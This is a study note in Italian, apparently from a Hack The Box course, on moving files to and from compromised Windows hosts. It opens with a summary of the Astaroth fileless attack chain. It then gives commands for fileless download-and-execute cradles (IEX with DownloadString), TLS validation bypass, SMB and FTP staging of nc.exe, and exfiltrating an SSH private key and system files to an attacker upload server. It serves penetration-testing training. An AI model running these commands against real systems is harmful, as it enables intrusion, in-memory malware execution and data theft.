# Table of contents


# Windows file transfer methods
## Introduction
Microsoft astaroth attack blog post an example of and advanced persistent threat (APT).
Le minacce "fileless" non implicano l'assenza totale di un trasferimento file, ma indicano che i payload non risiedono in modo permanente sul disco, venendo invece eseguiti direttamente in memoria.

L'attacco abusa di strumenti legittimi già presenti nel sistema operativo Windows (tecnica nota come Living off the Land o LOLBins).

Sequenza Fase per Fase dell'Attacco Astaroth:
- Vettore di Accesso Iniziale (Spear-Phishing):
L'attacco prende il via con un link malevolo all'interno di un'email di spear-phishing che porta al download di un file scorciatoia con estensione .LNK.

- Esecuzione Iniziale via WMIC:
Al doppio clic dell'utente sul file .LNK, viene richiamato lo strumento nativo WMIC (wmic.exe).
Tramite il parametro /Format, WMIC scarica ed esegue un codice JavaScript malevolo.

- Download dei Payload tramite Bitsadmin:
Il codice JavaScript abusato invoca lo strumento di sistema Bitsadmin (bitsadmin.exe) per scaricare sul sistema i payload successivi.

- Offuscamento e Decodifica con Certutil:
Tutti i payload scaricati sono inizialmente codificati in Base64.
Viene utilizzato lo strumento nativo Certutil (certutil.exe) per decodificare i file in formato Base64, ottenendo alcune librerie DLL.

- Caricamento DLL con Regsvr32:
Viene eseguito lo strumento Regsvr32 (regsvr32.exe) per caricare una delle DLL decodificate.

- Iniezione Finale del Malware:
La DLL caricata provvede a decifrare e caricare ulteriori file intermedi, fino ad eseguire l'iniezione del payload finale di Astaroth direttamente
![img](https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

## PowerShell base64 encode & decode
Quando non è disponibile una connessione di rete diretta ma si possiede un accesso terminale, è possibile trasferire file convertendoli in stringhe Base64:

1. Si codifica il file nel sistema di origine.

2. Si copia la stringa nel terminale di destinazione.

3. Si decodifica la stringa per ricreare il file originale.

4. Si verifica l'integrità del file tramite l'hash MD5.

Passaggi Operativi:

1. Verifica e Codifica (Linux / Pwnbox)
Calcolo MD5 originario:

comando: md5sum id_rsa

Output di esempio: 4e301756a07ded0a2dd6953abf015278  id_rsa

2. Conversione in Base64 (linea singola senza a capo): 

comando: cat id_rsa | base64 -w 0; echo

3. Decodifica (usando funzione PowerShell)
Scrittura e decodifica diretta del file:

comando: \[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", \[Convert]::FromBase64String("<STRINGA_BASE64>"))

4. Verifica Integrità (Windows PowerShell)
Confronto dell'hash MD5:

comando: Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

(Verificare che l'hash restituito corrisponda perfettamente a quello generato su Linux).

Limitazioni da considerare
CMD.exe: Ha un limite massimo di 8191 caratteri per stringa.

Web Shell: Possono restituire errori se si inviano stringhe Base64 troppo grandi.

## Powershell web downloads

- OpenRead:	Returns the data from a resource as a Stream.
- OpenReadAsync:	Returns the data from a resource without blocking the calling thread.
- DownloadData:	Downloads data from a resource and returns a Byte array.
- DownloadDataAsync:	Downloads data from a resource and returns a Byte array without blocking the calling thread.
- DownloadFile:	Downloads data from a resource to a local file.
- DownloadFileAsync:	Downloads data from a resource to a local file without blocking the calling thread.
- DownloadString:	Downloads a String from a resource and returns a String.
- DownloadStringAsync:	Downloads a String from a resource without blocking the calling thread.

### File download
- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('\<Target File URL>','\<Output File Name>')
- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('\<Target File URL>','\<Output File Name>')

### PowerShell DownloadString - Fileless Method
Gli attacchi fileless sfruttano funzionalità native del sistema operativo per scaricare ed eseguire il payload direttamente in memoria, senza mai salvarlo sul disco rigido. Questo riduce la traccia lasciata sul sistema e rende l'individuazione più difficile per molti antivirus.

In PowerShell, questo meccanismo si implementa principalmente tramite il cmdlet Invoke-Expression (o il suo alias IEX).

Punti Chiave del Trasferimento Fileless,
Download in Memoria:

Utilizzando .DownloadString(), PowerShell scarica il codice dello script sotto forma di stringa senza creare un file temporaneo su disco.

Esecuzione Immediata:

Inoltrando la stringa a IEX, il contenuto scaricato viene interpretato ed eseguito istantaneamente nello spazio di memoria del processo PowerShell corrente. IEX esegue una stringa specifica e ritorna il risultato del comando o dell'espressione.

Sintassi di Esempio
1. Chiamata Diretta:
IEX (New-Object Net.WebClient).DownloadString('https://<URL_PAYLOAD>/script.ps1')
2. IEX accetta pipelone in input: 
(New-Object Net.WebClient).DownloadString('https://<URL_PAYLOAD>/script.ps1') | IEX


### PowerShell Invoke-WebRequest
Invoke-WebRequest cmdlet da Powershell 3.0, si può usare come alias curl,wget, iwr.
- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

- [cradels](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)


### Common Errors with PowerShell
Può essere che la configurazione di explorer non sia completa, il che impedisce il download.
Questo puo essere bypassato tramite il parametro -UseBasicParsing
- PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

Un altro errore nei downloads Powershell riguarda ssl/tls se il certificato non è fidato, si bypassa con il comando:  PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

## SMB downloads

Il protocollo SMB (porte TCP/445) è ampiamente diffuso nelle reti enterprise Windows. Permette di trasferire file da/verso server remoti creando una condivisione locale sull'attaccante e usandola direttamente dalla macchina Windows target tramite comandi standard come copy, move o Copy-Item.

### Create the SMB Server
sudo impacket-smbserver <NOME_SHARE> -smb2support <PERCORSO_LOCALE>

Esempio: sudo impacket-smbserver share -smb2support /tmp/smbshare

### Copy a file from the smb server
C:\htb> copy \\192.168.220.133\share\nc.exe

Nuove versioni di windows bloccano accessi non autenticati degli utenti

### Create the SMB Server with a Username and Password
crirom00@htb[/htb]$ sudo impacket-smbserver <NOME_SHARE> -smb2support <PERCORSO_LOCALE> -user <USER> -password <PASS>

Esempio: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

### Mount the SMB Server with Username and Password
C:\htb> net use n: \\192.168.220.133\share /user:test test

C:\htb> copy n:\nc.exe

Download del File (Target / Windows)Copia diretta da condivisione anonima:DOScopy \\<IP_ATTACCANTE>\<NOME_SHARE>\file.exe
Montaggio della condivisione con credenziali (se l'accesso guest è bloccato):DOSnet use n: \\<IP_ATTACCANTE>\<NOME_SHARE> /user:<USER> <PASS>

## FTP downloads
Trasferimento fils con ftp sulla porta tcp/21 e tcp/20. Si usa Net.WebClient per scaricare files dal server ftp. Configurazione server ftp per attacco con modulo pyftplib.

### Installing the FTP Server Python3 Module - pyftpdlib
crirom00@htb[/htb]$ sudo pip3 install pyftpdlib

### Setting up a Python3 FTP Server
crirom00@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

Di default pyftplib usa port 2121, autenticaizone anonima è abilitata se username e password non sono specificati. Dopo setup del server ftp, possiamo trasferire file con il client ftp pre installato in windows oppure con Net.WebClient.

### Transferring Files from an FTP Server Using PowerShell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

Quando otteniamo una shell su una macchina remota, potremmo non avere una shell interattiva. In tal caso, possiamo creare un file di comandi FTP per scaricare un file.

### Create a Command File for the FTP Client and Download the Target File
- C:\htb> echo open 192.168.49.128 > ftpcommand.txt
- C:\htb> echo USER anonymous >> ftpcommand.txt
- C:\htb> echo binary >> ftpcommand.txt
- C:\htb> echo GET file.txt >> ftpcommand.txt
- C:\htb> echo bye >> ftpcommand.txt
- C:\htb> ftp -v -n -s:ftpcommand.txt
- ftp> open 192.168.49.128
Log in with USER and PASS first.
- ftp> USER anonymous
- ftp> GET file.txt
- ftp> bye
- C:\htb>more file.txt

## Upload Operations
Invio dati dal target all'attaccante.
Diversi modi per caricare file:

### PowerShell Base64 Encode & Decode
Encode a file using powershell:

- PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) -> ritorna \<stringabase64>

- PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash -> ritorna hash del contenuto del file hosts

Decode base64 string in linux:
- crirom00@htb[/htb]$ echo \<stringabase64> | base64 -d > hosts
- crirom00@htb[/htb]$ md5sum hosts -> ritorna 3688374325b992def12793500307566d  hosts

## PowerShell Web Uploads
Powershell non ha funzioni built in per fare upload, ma possiamo usare Invoke-WebRequest or Invoke-RestMethod to build our upload function. Serve anche un server che accetti gli uploads, cosa che non è di default nei comuni webserver.
#### Installing a Configured WebServer with Upload
- crirom00@htb[/htb]$ pip3 install uploadserver
- crirom00@htb[/htb]$ python3 -m uploadserver
#### PowerShell Script to Upload a File to Python Upload Server
- PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
- PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373